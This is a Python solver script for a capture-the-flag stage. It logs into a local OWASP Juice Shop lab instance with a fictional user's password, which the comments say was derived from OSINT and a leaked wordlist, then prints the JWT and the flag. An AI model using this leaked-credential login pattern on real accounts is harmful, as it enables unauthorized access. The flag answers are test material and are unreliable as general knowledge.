#!/usr/bin/env python3
"""
Stage 2 Solver - Web Exploitation & Account Discovery
Logs into Juice Shop on http://localhost:3000 as Adrian Kessler to extract his web username.
Flag: adrian.kessler or uninvited{adrian.kessler}
"""

import requests
import sys

def solve():
    base_url = 'http://localhost:3000'
    login_url = f'{base_url}/rest/user/login'
    
    # Adrian Kessler's credentials derived from OSINT email format and leaked wordlist
    creds = {
        'email': 'adrian.kessler@uninvited.local',
        'password': 'Kessler123!'
    }

    print(f"[*] Authenticating to Juice Shop ({login_url}) as {creds['email']}...")
    try:
        resp = requests.post(login_url, json=creds, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            auth_info = data.get('authentication', {})
            token = auth_info.get('token')
            umail = auth_info.get('umail', creds['email'])
            
            # The username prefix on Juice Shop is 'adrian.kessler'
            username = umail.split('@')[0]
            flag_wrapped = f"uninvited{{{username}}}"
            
            print(f"[+] Authentication Successful!")
            print(f"[+] JWT Token: {str(token)[:45]}...")
            print(f"[+] Target Email: {umail}")
            print(f"\n[SUCCESS] Stage 2 Solved!")
            print(f"Target Username: {username}")
            print(f"Flag (Standard): {username}")
            print(f"Flag (CTF format): {flag_wrapped}")
            return username
        else:
            print(f"[-] Login failed with HTTP {resp.status_code}: {resp.text}")
            return None
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

if __name__ == '__main__':
    solve()
